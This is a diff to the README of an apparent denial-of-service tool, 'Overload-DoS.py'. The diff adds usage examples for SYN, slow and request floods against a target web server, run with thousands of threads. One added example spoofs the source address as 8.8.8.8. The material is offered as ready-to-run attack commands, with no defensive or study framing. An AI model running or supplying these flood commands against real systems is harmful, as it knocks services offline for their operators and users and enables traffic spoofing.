@@ -70,6 +70,15 @@ SYN/6 flagged ICMP attack method
 ```
 ./Overload-DoS.py -target www.target.com -syn -threads 5000
 ```
+SLOW/Request/SYN attack method
+```
+./Overload-DoS.py -target www.target.com -port 80 -threads 2000 -request -slow -syn
+```
+SLOW/Request/SYN spoofed IP attack method
+```
+./Overload-DoS.py -target www.target.com -port 80 -threads 2000 -request -slow -syn -spoof 8.8.8.8
+```
+
 ## Built With
 
 * [Python 2.7](https://www.python.org/download/releases/2.7/) - The code framework used
